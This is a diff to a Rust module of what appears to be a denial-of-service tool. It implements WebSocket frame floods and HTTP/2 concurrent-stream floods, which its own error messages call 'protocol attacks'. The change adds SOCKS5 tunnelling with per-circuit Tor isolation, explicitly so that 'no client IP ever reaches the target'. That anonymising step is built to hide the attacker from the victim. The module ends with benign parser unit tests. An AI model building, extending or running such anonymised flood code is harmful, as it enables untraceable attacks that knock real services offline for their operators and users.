@@ -7,11 +7,12 @@
 //!   carrying a DATA payload — a fundamentally different stress vector than the
 //!   HTTP/1.1 modes and distinct from the RST-based `h2rapidreset`.
 //!
-//! Both open their own connection directly to the target host:port (they need
-//! raw byte control that reqwest's pooled client does not expose), so unlike the
-//! HTTP/1.1 modes they do not route through the proxy pool. The target must be
-//! an `https://`/`wss://` URL (TLS is required — plaintext h2c/ws are not
-//! supported here).
+//! Both open their own connection to the target host:port (they need raw byte
+//! control that reqwest's pooled client does not expose). When a SOCKS5 proxy
+//! is supplied the whole connection — TCP + TLS — is tunnelled through it, so
+//! no client IP ever reaches the target (zero-IP-leakage Tor routing). The
+//! target must be an `https://`/`wss://` URL (TLS is required — plaintext
+//! h2c/ws are not supported here).
 
 use crate::types::FetchError;
 use futures::SinkExt;
@@ -113,20 +114,97 @@ fn build_tls_config(insecure: bool) -> Arc<rustls::ClientConfig> {
     Arc::new(cfg)
 }
 
-/// Establish a TLS TCP connection to the target.
+/// Parse a `socks5h://[user:pass@]host:port` SOCKS5 proxy URL into
+/// `(host, port, Option<(username, password)>)`. Bare `host:port` also works.
+///
+/// Tor convention: the userinfo is used as a per-circuit isolation stream id
+/// (e.g. `tor0:isolate@` names a distinct stream so Tor assigns a new circuit),
+/// so we pass it as the SOCKS5 username when present.
+fn parse_socks5_proxy(url: &str) -> (String, u16, Option<(String, String)>) {
+    let u = match url::Url::parse(url) {
+        Ok(u) => u,
+        _ => {
+            // Bare host:port fallback.
+            let (host, port) = url.rsplit_once(':').unwrap_or((url, "9050"));
+            return (host.to_string(), port.parse().unwrap_or(9050), None);
+        }
+    };
+    let host = u.host_str().unwrap_or("127.0.0.1").to_string();
+    let port = u.port().unwrap_or(9050);
+    let auth = if u.username().is_empty() && u.password().is_none() {
+        None
+    } else {
+        Some((u.username().to_string(), u.password().unwrap_or_default().to_string()))
+    };
+    (host, port, auth)
+}
+
+/// Open a TCP connection to `host:port`, optionally tunnelled through a SOCKS5
+/// proxy. When `proxy` is `Some`, the entire connection (including TLS for
+/// wss/h2) is established through the proxy so no client IP ever reaches the
+/// target — required for zero-IP-leakage Tor routing. Returns `Err` if the
+/// proxy handshake fails so the caller can pick another circuit/proxy.
+async fn dial_tcp(
+    host: &str,
+    port: u16,
+    proxy: Option<&str>,
+) -> Result<TcpStream, FetchError> {
+    match proxy {
+        Some(p) => {
+            let (phost, pport, auth) = parse_socks5_proxy(p);
+            let tcp = match auth {
+                Some((user, pass)) => {
+                    tokio::time::timeout(
+                        Duration::from_secs(15),
+                        tokio_socks::tcp::Socks5Stream::connect_with_password(
+                            (phost.as_str(), pport),
+                            (host.to_string(), port),
+                            &user,
+                            &pass,
+                        ),
+                    )
+                    .await
+                    .map_err(|_| format!("SOCKS5 connect timeout via {}", p))?
+                    .map_err(|e| format!("SOCKS5 connect via {} failed: {}", p, e))?
+                }
+                None => {
+                    tokio::time::timeout(
+                        Duration::from_secs(15),
+                        tokio_socks::tcp::Socks5Stream::connect(
+                            (phost.as_str(), pport),
+                            (host.to_string(), port),
+                        ),
+                    )
+                    .await
+                    .map_err(|_| format!("SOCKS5 connect timeout via {}", p))?
+                    .map_err(|e| format!("SOCKS5 connect via {} failed: {}", p, e))?
+                }
+            };
+            Ok(tcp.into_inner())
+        }
+        None => {
+            let addr = format!("{}:{}", host, port);
+            let tcp = tokio::time::timeout(Duration::from_secs(10), TcpStream::connect(&addr))
+                .await
+                .map_err(|_| format!("connect timeout to {}", addr))?
+                .map_err(|e| format!("connect to {} failed: {}", addr, e))?;
+            Ok(tcp)
+        }
+    }
+}
+
+/// Establish a TLS TCP connection to the target (through SOCKS5 when proxying).
 async fn dial(
     host: &str,
     port: u16,
     is_tls: bool,
     insecure: bool,
+    proxy: Option<&str>,
 ) -> Result<tokio_rustls::client::TlsStream<TcpStream>, FetchError> {
     if !is_tls {
         return Err("plaintext protocol attacks not supported; use an https:// target".into());
     }
-    let addr = format!("{}:{}", host, port);
-    let tcp = tokio::time::timeout(Duration::from_secs(10), TcpStream::connect(&addr))
-        .await
-        .map_err(|_| format!("connect timeout to {}", addr))??;
+    let tcp = dial_tcp(host, port, proxy).await?;
     let _ = tcp.set_nodelay(true);
     let cfg = build_tls_config(insecure);
     let server_name = rustls::pki_types::ServerName::try_from(host.to_string())
@@ -134,7 +212,7 @@ async fn dial(
     let connector = tokio_rustls::TlsConnector::from(cfg);
     let tls = tokio::time::timeout(Duration::from_secs(10), connector.connect(server_name, tcp))
         .await
-        .map_err(|_| format!("TLS handshake timeout to {}", addr))??;
+        .map_err(|_| format!("TLS handshake timeout to {}:{}", host, port))??;
     Ok(tls)
 }
 
@@ -144,28 +222,38 @@ async fn dial(
 /// Complete a real WebSocket handshake with `tokio-tungstenite`, then flood
 /// binary frames over the open socket. Reports total bytes sent as the
 /// "response bytes" and the handshake HTTP status (101) on success.
+///
+/// The socket is dialed through `proxy` (SOCKS5) when provided so the handshake
+/// and frames are fully Tor-routed.
 pub(crate) async fn fetch_websocket_flood(
     url: String,
     delay: u64,
     verbose: bool,
-    _insecure: bool,
+    insecure: bool,
     n_frames: usize,
+    proxy: Option<&str>,
 ) -> Result<(usize, u16), FetchError> {
     if delay > 0 {
         tokio::time::sleep(Duration::from_millis(delay)).await;
     }
-    let (_host, _port, is_tls, path, authority) = parse_target(&url)?;
+    let (host, port, is_tls, path, authority) = parse_target(&url)?;
     let scheme = if is_tls { "wss" } else { "ws" };
     let ws_url = format!("{}://{}{}", scheme, authority, path);
     if verbose {
         println!(
-            "[VERBOSE] fetch_websocket_flood: connecting to {} ({} frames)",
-            ws_url, n_frames
+            "[VERBOSE] fetch_websocket_flood: connecting to {} ({} frames, proxy: {})",
+            ws_url,
+            n_frames,
+            proxy.unwrap_or("direct")
         );
     }
 
-    // tokio-tungstenite handles TCP + TLS + the WS upgrade handshake.
-    let (mut ws, resp) = tokio_tungstenite::connect_async(&ws_url)
+    // Dial TCP (+TLS) ourselves so we can route it through the SOCKS5 proxy,
+    // then hand the established stream to tungstenite for the WS upgrade.
+    let tls = dial(&host, port, is_tls, insecure, proxy).await?;
+    let request = tokio_tungstenite::tungstenite::client::IntoClientRequest::into_client_request(ws_url)
+        .map_err(|e| format!("ws request build failed: {}", e))?;
+    let (mut ws, resp) = tokio_tungstenite::client_async(request, tls)
         .await
         .map_err(|e| format!("ws connect failed: {}", e))?;
     let status = resp.status().as_u16();
@@ -205,22 +293,28 @@ pub(crate) async fn fetch_websocket_flood(
 /// on the single connection, each POSTing a DATA payload. Exercises the server's
 /// concurrent-stream state machine and per-stream buffers — distinct from both
 /// the HTTP/1.1 floods and the RST-based `h2rapidreset`.
+///
+/// The connection is dialed through `proxy` (SOCKS5) when provided so the h2
+/// handshake and all streams are fully Tor-routed.
 pub(crate) async fn fetch_h2_stream_flood(
     url: String,
     delay: u64,
     verbose: bool,
     insecure: bool,
     n_streams: usize,
+    proxy: Option<&str>,
 ) -> Result<(usize, u16), FetchError> {
     if delay > 0 {
         tokio::time::sleep(Duration::from_millis(delay)).await;
     }
     let (host, port, is_tls, path, authority) = parse_target(&url)?;
-    let tls = dial(&host, port, is_tls, insecure).await?;
+    let tls = dial(&host, port, is_tls, insecure, proxy).await?;
     if verbose {
         println!(
-            "[VERBOSE] fetch_h2_stream_flood: {} | {} streams over 1 connection",
-            url, n_streams
+            "[VERBOSE] fetch_h2_stream_flood: {} | {} streams over 1 connection (proxy: {})",
+            url,
+            n_streams,
+            proxy.unwrap_or("direct")
         );
     }
 
@@ -283,4 +377,50 @@ pub(crate) async fn fetch_h2_stream_flood(
         );
     }
     Ok((sent, if first_status == 0 { 200 } else { first_status }))
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn socks5_parse_full_tor_url() {
+        let (host, port, auth) = parse_socks5_proxy("socks5h://tor3:isolate@127.0.0.1:9050");
+        assert_eq!(host, "127.0.0.1");
+        assert_eq!(port, 9050);
+        assert_eq!(auth, Some(("tor3".to_string(), "isolate".to_string())));
+    }
+
+    #[test]
+    fn socks5_parse_bare_host_port() {
+        let (host, port, auth) = parse_socks5_proxy("192.168.1.5:1080");
+        assert_eq!(host, "192.168.1.5");
+        assert_eq!(port, 1080);
+        assert_eq!(auth, None);
+    }
+
+    #[test]
+    fn socks5_parse_no_auth_url_defaults_port() {
+        let (host, port, auth) = parse_socks5_proxy("socks5h://localhost");
+        assert_eq!(host, "localhost");
+        assert_eq!(port, 9050);
+        assert_eq!(auth, None);
+    }
+
+    #[test]
+    fn parse_target_https_with_path_and_query() {
+        let (host, port, is_tls, path, authority) =
+            parse_target("https://example.com:8443/api?q=1").unwrap_or_else(|e| panic!("parse: {}", e));
+        assert_eq!(host, "example.com");
+        assert_eq!(port, 8443);
+        assert!(is_tls);
+        assert_eq!(path, "/api?q=1");
+        assert_eq!(authority, "example.com:8443");
+    }
+
+    #[test]
+    fn parse_target_rejects_plain_http_for_tls_only_modes() {
+        let (_, _, is_tls, _, _) = parse_target("http://example.com/x").unwrap_or_else(|e| panic!("parse: {}", e));
+        assert!(!is_tls);
+    }
 }
